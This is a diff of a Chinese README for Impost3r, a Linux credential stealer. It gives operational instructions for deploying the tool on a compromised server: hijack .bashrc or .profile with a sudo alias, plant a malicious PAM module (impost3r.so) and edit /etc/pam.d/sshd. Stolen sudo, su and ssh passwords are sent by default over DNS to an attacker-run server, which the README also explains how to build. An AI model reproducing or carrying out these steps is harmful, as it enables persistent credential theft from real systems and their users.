@@ -35,9 +35,22 @@ Impost3r可以用来窃取包括sudo、su、ssh服务在内的密码，这三个
 
 - 首先假设攻击者控制了一台服务器，权限为普通用户权限
 
-- 拷贝一份用户的.bashrc```cp ～/.bashrc /tmp/```，并将这份副本放在攻击者自定义的路径下(本例中放置在/tmp/目录下，攻击者可以修改)
+- 检查用户根目录下是否存在```.bash_profile```文件，如果```.bash_profile```存在:检查```.bash_profile```文件中是否主动加载了```.bashrc```，如果主动加载，则跳过此步骤及下一步检查，继续进行之后的操作,如果未主动加载,那么**下文中所有针对```.bashrc```的操作全部更换为针对```.bash_profile```的操作!!!**;如果```.bash_profile```不存在: 进行下一步检查。
 
-- 修改用户根目录下的.bashrc(～/.bashrc)，在最后一行添加如下语句(其中“/tmp/.impost3r”需要与下面的FILENAME保持一致)：
+- 检查用户根目录下是否存在```.profile```文件，如果存在```.profile```文件:检查```.profile```文件中是否主动加载了```.bashrc```(默认情况下加载)，如果主动加载，则跳过此步骤，继续进行之后的操作,如果未主动加载,那么**下文中所有针对```.bashrc```的操作全部更换为针对```.profile```的操作!!!**;如果```.profile```也不存在，原则上Impost3r将无法使用，当然你也可以视情况自己决定是否生成```.bash_profile```或者```.profile```文件，并往其中写入类似如下的加载代码来加载```.bashrc```
+
+```
+if [ -n "$BASH_VERSION" ]; then
+    # include .bashrc if it exists
+    if [ -f "$HOME/.bashrc" ]; then
+	. "$HOME/.bashrc"
+    fi
+fi
+```
+
+- 拷贝一份用户的```.bashrc```:```cp ～/.bashrc /tmp/```，并将这份副本放在攻击者自定义的路径下(本例中放置在/tmp/目录下，攻击者可以修改)
+
+- 修改用户根目录下的```.bashrc```(～/.bashrc)，在最后一行添加如下语句(其中“/tmp/.impost3r”需要与下面的FILENAME保持一致)：
 
 ```
 alias sudo='impost3r() {
@@ -58,7 +71,8 @@ fi
     Custom setting
 */
 # define FILENAME "/tmp/.impost3r" \\设置Impost3r在目标服务器上的位置
-# define BACKUP_BASHRC "/tmp/.bashrc" \\设置攻击者备份的源.bashrc在目标服务器上的位置
+# define BACKUP_ORI_FILENAME ".bashrc" \\表明攻击者所备份的源用户配置文件是.bashrc还是.bash_profile亦或者是.profile
+# define BACKUP_ORI_PATH "/tmp/.bashrc" \\表明攻击者所备份的源用户配置文件在目标服务器上的位置
 # define SAVE_OR_SEND 0 \\设置在窃取成功后是将结果保存在目标机器上或者是发送至攻击者控制的机器(发送=0，保存=1，默认为发送)
 
 /*
@@ -131,9 +145,9 @@ fi
 
 - 修改完成后，保存并在当前目录下执行```make```
 
-- 得到编译好的文件impost3r.so
+- 得到编译好的文件```impost3r.so```
 
-- 将编译完成的impost3r.so上传(尽量在目标服务器编译，防止产生非预期的错误)至目标机器的```/lib/x86_64-linux-gnu/security```下(不同机器可能文件夹名不同，请根据情况放置)
+- 将编译完成的```impost3r.so```上传(尽量在目标服务器编译，防止产生非预期的错误)至目标机器的```/lib/x86_64-linux-gnu/security```下(不同机器可能文件夹名不同，请根据情况放置)
 
 - 进入```/etc/pam.d```下，这时分两种情况，如果选择的模式是仅偷取ssh密码，那么就需要执行```vi sshd```,在文件的最后添加如下语句
 
@@ -165,7 +179,7 @@ account optional impost3r.so
 ## 注意事项
 
 - Dns服务端程序我使用的是[Fdns](https://github.com/deepdarkness/Fdns)，并修改了一部分参数，大家可在文件夹Fdns下找到修改后的源代码，请自行利用命令```gcc -o dns main.c util.c```编译(注意要先修改main.c中的监听端口)
-- 在编译Fdns之前,请查看util.h中的YOUR_DOMAIN值，确保此值与被植入服务器上的Impost3r程序所编译时使用的YOUR_DOMAIN值是一致的，不然可能会导致窃取的失败
+- 在编译Fdns之前,请查看```util.h```中的```YOUR_DOMAIN```值，确保此值与被植入服务器上的Impost3r程序所编译时使用的```YOUR_DOMAIN```值是一致的，不然可能会导致窃取的失败
 - 此程序仅是闲暇时开发学习，功能可能存在bug，请多多谅解，也欢迎反馈问题
 
 ## 致谢
